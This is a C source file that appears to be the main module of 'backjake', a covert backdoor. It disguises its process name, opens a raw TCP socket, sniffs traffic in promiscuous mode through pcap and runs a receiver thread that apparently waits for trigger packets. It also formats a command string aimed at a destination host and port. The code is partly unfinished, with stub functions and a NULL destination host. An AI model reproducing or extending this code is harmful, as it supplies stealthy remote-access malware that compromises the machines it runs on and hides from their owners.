#include "backjake.h"

static sigjmp_buf jmpbuf;
static volatile sig_atomic_t canjump;
pthread_mutex_t ThreadLock = PTHREAD_MUTEX_INITIALIZER;
//int running = 1;

static void unlock (int signo);


int main(int argc, char** argv)
{
    running = 1;
    AddrInfo *Addr_Ptr;
    PcapInfo *pcap_ptr;
    //int opt;
    pthread_t ThreadID2;//, ThreadID;

    disguise(argv);
    //checkArgs(argc, argv);
    //setConfig();
    
    initializeAddress(&Addr_Ptr);
    initializeDoor(Addr_Ptr);
    initializePcap(&pcap_ptr, Addr_Ptr);
    setPcap(pcap_ptr, Addr_Ptr);
    initializeSocket(Addr_Ptr);
    setupSignals();

    //ReceiveDatagram((void*)pcap_ptr);
    pthread_create (&ThreadID2, NULL, ReceiveDatagram, (void *)pcap_ptr);
    pthread_join (ThreadID2, NULL);

    //free (Addr_Ptr);
    //free (pcap_ptr);
    return 0;
}

void initializeSocket(AddrInfo *Addr_Ptr)
{
    int arg;
    Addr_Ptr->RawSocket = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);
    
    arg = 1;
    if (setsockopt (Addr_Ptr->RawSocket, SOL_SOCKET, SO_REUSEADDR, &arg, sizeof(arg)) == -1) 
        perror("setsockopt");
}

void initializeAddress(AddrInfo **Addr_Ptr)
{
    if ((*Addr_Ptr = malloc (sizeof (AddrInfo))) == NULL)
    {
        perror ("malloc");
        exit (1);
    }
}

void initializePcap(PcapInfo **pcap_ptr, AddrInfo *Addr_Ptr)
{
    if ((*pcap_ptr = malloc (sizeof (PcapInfo))) == NULL)
    {
        perror ("malloc");
        exit (1);
    }
}

void setPcap(PcapInfo* pcap_ptr, AddrInfo *Addr_Ptr)
{
    char *nic_dev = "p2p1"; // CHANGE; 
    char errbuf[PCAP_ERRBUF_SIZE];
    bpf_u_int32 maskp;          // subnet mask    

    pcap_lookupnet (nic_dev, &pcap_ptr->netp, &maskp, errbuf);
    pcap_ptr->nic_descr = pcap_open_live (nic_dev, BUFSIZ, 1, -1, errbuf);
    
    if (pcap_ptr->nic_descr == NULL)
    { 
        printf("pcap_open_live(): %s\n",errbuf); 
        exit(1); 
    }

    snprintf (pcap_ptr->cmd, sizeof(pcap_ptr->cmd), CMD, Addr_Ptr->DstHost, Addr_Ptr->dport);
    printf("%s\n", pcap_ptr->cmd);
}

void initializeDoor(AddrInfo *Addr_Ptr)
{
    unsigned int iseed = (unsigned int)time(NULL);    // use the current time as the random seed value
    // seed random number generator
    srand(iseed);

    // set defaults
    Addr_Ptr->SrcHost = GetIPAddress();    // Default Source IP
    Addr_Ptr->DstHost = NULL;           // Must be specified by user!
    Addr_Ptr->dport = DEFAULT_DST_PORT;     // Default Destination Port
    Addr_Ptr->sport = rand()% 40000 + 2000; // Default (Random) Source Port between 2000 and 60000
}

void checkArgs(int argc, char **argv)
{
    if (argc < 2)
    {
        usage(argv);
    }
}

void setConfig()
{
 //   char* options = "";
   // options = readConfigFile();
}

char* readConfigFile()
{
    char* options = "lol";

    return options;
}